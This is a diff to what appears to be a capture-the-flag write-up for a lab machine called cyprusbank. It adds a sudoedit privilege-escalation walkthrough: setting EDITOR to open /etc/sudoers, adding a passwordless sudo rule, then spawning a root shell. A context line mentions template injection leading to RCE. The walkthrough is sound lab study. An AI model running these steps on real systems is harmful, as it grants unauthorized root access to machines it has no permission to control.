@@ -27,3 +27,40 @@ https://eslam.io/posts/ejs-server-side-template-injection-rce/?source=post_page-
 
 # Changing the ip address to your IP and receive it back > get RCE
 
+# Sudoedit privilege escalation
+```
+web@cyprusbank:~$ sudo -l
+
+Matching Defaults entries for web on cyprusbank:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User web may run the following commands on cyprusbank:
+    (ALL : ALL) NOPASSWD: ALL
+    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+
+# Steps by step
+
+```
+# export EDITOR="vim -- /etc/sudoers"
+# sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+
+```
+
+# In vim editor
+
+```
+Drags the way down AND write (web ALL=(ALL:ALL) NOPASSWD: ALL) and then save
+
+<img width="1145" height="587" alt="image" src="https://github.com/user-attachments/assets/e57b99d5-c9b2-4e20-9bd8-7b9643e0b796" />
+
+```
+
+# Finally got ROOT access
+
+```
+# sudo bash
+```
